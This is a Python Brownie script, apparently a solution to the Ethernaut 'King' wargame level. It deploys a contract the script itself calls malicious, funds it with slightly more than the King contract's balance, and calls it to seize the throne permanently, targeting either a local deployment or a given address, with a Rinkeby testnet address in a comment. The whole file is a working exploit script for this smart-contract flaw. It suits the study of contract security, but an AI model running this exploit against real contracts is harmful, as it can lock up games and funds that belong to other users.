#!/usr/bin/python3
from brownie import King, KingForever
from colorama import Fore
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account
from web3 import Web3 as w3

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET

# * Rinkeby address : 0x7C3045256c8447659bd6e041110caef3e653bB2F


def overthrowKing(contract_address=None, attacker=None):
    if not contract_address:
        king_contract, owner = deploy()
        contract_address = king_contract.address
        # ? Geeting the accounst for local testing
        _, attacker = get_account()
    else:
        king_contract = King.at(contract_address)
    # print(contract_address)

    king_contract_balance = w3.fromWei(king_contract.balance(), "ether")

    print(f"{green}Current KING -> {magenta}{king_contract._king()}{reset}")
    print(
        f"{green}Current Contract Balance -> {magenta}{king_contract_balance} ETH{reset}"
    )

    amount = float(king_contract_balance) + 0.05
    # print(amount)

    # * Deploye the malicious contract
    king_forever = KingForever.deploy(
        {"from": attacker, "amount": w3.toWei(amount, "ether")}
    )
    print(
        f"{green}Balance of Attacking Contract -> {magenta}{w3.fromWei(king_forever.balance(), 'ether')} ETH{reset}"
    )

    king_forever.overthrowKing(contract_address, {"from": attacker})

    print(
        f"{green}Balance of Attacking Contract -> {magenta}{w3.fromWei(king_forever.balance(), 'ether')} ETH{reset}"
    )

    print(f"{green}Current KING -> {magenta}{king_contract._king()}{reset}")
    print(
        f"{green}Current Contract Balance -> {magenta}{king_contract_balance} ETH{reset}"
    )


def main(contract_address=None):
    if contract_address:
        overthrowKing(contract_address, get_account())
    else:
        overthrowKing()


if __name__ == "__main__":
    main()
